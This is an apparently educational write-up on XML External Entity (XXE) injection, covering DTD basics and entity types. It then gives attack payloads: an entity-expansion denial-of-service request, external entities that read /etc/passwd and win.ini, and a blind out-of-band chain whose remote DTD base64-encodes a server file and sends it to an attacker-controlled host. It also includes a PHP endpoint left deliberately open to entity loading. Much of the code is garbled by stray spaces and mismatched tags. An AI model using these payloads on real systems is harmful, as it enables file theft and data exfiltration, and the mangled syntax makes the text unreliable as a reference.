I'll be learning and going over the basic concepts, from the basic concept principle-> utilization-> auditing-> defense.    

## xxe Introduction 
XXE (XML External Entity Injection, XML External Entity), when the application parses XML input, when external entities are allowed to be referenced, malicious content can be constructed to cause reading of arbitrary files or SSRF, port detection, DoS denial of service attacks, and execution of system commands , Attack internal websites, etc. XXE in Java supports all protocols in sun.net.www.protocol : http , https , file, ftp , mail to, jar, netdoc . Generally, the file protocol is used to read files, and the http protocol is used to detect the internal network. When no echo is displayed, the file protocol and the ftp protocol can be used to read the files.   



## Related Basic Concepts 
#### XML & DTD   

XML (Extensible Markup Language) is a markup language used to transfer and store data   

The role of DTD ( Document Type Definition) is to define the legal building blocks of XML documents. It uses a series of legal elements to define the document structure.   

#### Entity ENTITY

Entity types in XML generally have the following types: character entities, named entities (or internal entities), external entities (including: external ordinary entities, external parameter entities). Except for the external parameter entities, all other entities start with the character (&) and end with the character (;).   

#### DTD reference method
a) DTD internal statement   
`<!DOCTYPE Root Element [Element Declaration]>`   

b) DTD external references   
`<!DOCTYPE Root Element Name SYSTEM “Outside DTD Of URI">`  

c) Reference to a public DTD   
`<!DOCTYPE Root Element Name PUBLIC “DTD Distinguished name" “Public DTD of URI">`  


## 0x0 Character entity
The character entity is similar to the entity encoding of html, such as a (decimal) or a (hexadecimal).   

## 0x1 named entity (internal entity)
Internal entities are also called named entities. Named entities can be said to be variable declarations. Named entities can only live at the beginning of a DTD or XML file (<! DOCTYPE> statement).    

Named entities (or internal entity syntax):  
`<! ENTITY entity name" entity value "> `   
Such that:   
```
<? xml version = "1.0" encoding = "utf-8"?> 
<! DOCTYPE root [ 
    <! ENTITY x "First Param!"> 
    <! ENTITY y "Second Param!">
]>
<root> <x> & x; </ x> <y> & y; </ y> </ root>
```   

#### Explenation 
Define an entity name with a value of First Param!   
`& x; Reference entity x`    
Knowing the above syntax, you can use the data type definition (DTD) named foo to construct the following 
request:   
```
POST http://example.com/xml HTTP/1.1

<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar "World">
]>
<foo>
  Hello &bar;
</foo>
```   
response:   
```
HTTP / 1.0 200 OK

Hello World
```   

The bar element is an alias for the word "World". This internal entity may seem harmless, but an attacker can use an XML entity to cause a denial of service attack by embedding the entity within the entity.    
Some XML parsers automatically limit the amount of memory they can use.   
Such as:   
request:   
```
POST http://example.com/xml HTTP/1.1

<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar "World ">
  <!ENTITY t1 "&bar;&bar;">
  <!ENTITY t2 "&t1;&t1;&t1;&t1;">
  <!ENTITY t3 "&t2;&t2;&t2;&t2;&t2;">
]>
<foo>
  Hello &t3;
</foo>
```    
response:   
```
HTTP/1.0 200 OK

Hello World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World
```

## 0x2 External Common Entity  
An external entity is used to load the contents of an external file. (Shows that XXE attacks mainly use ordinary entities)   
External general entity syntax:   
`<!ENTITY Entity Name SYSTEM "URI/URL"`
Such as:   
```
<! DOCTYPE foo [<! ELEMENT foo ANY> 
<! ENTITY xxe SYSTEM "file: /// etc / passwd"> ]>
 <foo> & xxe; </ xxe>
```   
```
<? xml version = "1.0" encoding = "utf-8"?> 
<! DOCTYPe root [ 
    <! ENTITY outfile SYSTEM "outfile.xml">
]>
<root> <outfile> & outfile; </ outfile> </ root>
```    

## 0x3 External PArameter Entity 
```
<! ENTITY% entity name "entity value">
or
<! ENTITY% entity name SYSTEM "URI">
```   
Parameter entities are used in internal subsets of DTDs and documents. Unlike ordinary entities, it starts with a character (%) and ends with a character (;). Only in the DTD file may make other entities referenced when the parameter entity is declared.   
(Blind XXE attacks often use parameter entities for data echo)   
Example 1:   
```
<! DOCTYPE foo [<! ELEMENT foo ANY> 
<! ENTITY% xxe SYSTEM "http: //xxxx/evil.dtd">
% xxe;]>
<foo> & evil; </ foo>
```   
The contents of evil.dtd are:
`<!ENTITY evil SYSTEM “file:///c:/windows/win.ini" >`

Example 2:   
```
<? xml version = "1.0" encoding = "utf-8"?> 
<! DOCTYPE root [ 
    <! ENTITY% param1 "Hello"> 
    <! ENTITY% param2 ""> 
    <! ENTITY% param3 "World"> 
    <! ENTITY dtd SYSTEM "combine.dtd">
    % dtd;
]>
<root> <foo> & content </ foo> </ root>
```   
The content of combine.dtd is:   
`<!ENTITY content "%parm1;%parm2;%parm3;">`   
Explanation:   
A basic entity is defined in combine.dtd above, which references 3 parameter entities:% param1 ;,% param2 ;,% param3 ;.    
The parsed `<foo>…</foo>` content is Hello World.    


### The Calling Process 

xml.php
```
<? php

libxml_disable_entity_loader (false); 
$ xmlfile = file_get_contents ('php: // input'); 
$ dom = new DOMDocument (); 
$ dom-> loadXML ($ xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
?>
```

test.dtd 
```
<! ENTITY% file SYSTEM "php: //filter/read=convert.base64-encode/resource=file: /// D: /test.txt"> 
<! ENTITY% int "<! ENTITY% send SYSTEM 'http : // ip: 9999? p =% file; '> ">
```  

payload: 
```
<! DOCTYPE convert [ 
<! ENTITY% remote SYSTEM "http: //ip/test.dtd">
% remote;% int;% send;
]>
```
from payloads we have three parameter `entities%` `remote;%` `int;% send;` are called consecutively. This is our order of use .% Remote is called first, and after calling it requests test.dtd on the remote server, which is similar to Include test.dtd, then% int calls% file in test.dtd, and% file will get the sensitive files on the server, and then fill the result of% file into% send (because the value of the entity cannot be %, So it is converted to html entity encoding &#37;), we then call% send; and send our read data to our remote vps, so that the effect of the out-of-band data is achieved, and the XXE is perfectly solved No echo issues.   
![issue1](https://user-images.githubusercontent.com/25066959/70174277-8e87d100-16a2-11ea-98dd-7770b56fa049.PNG)
  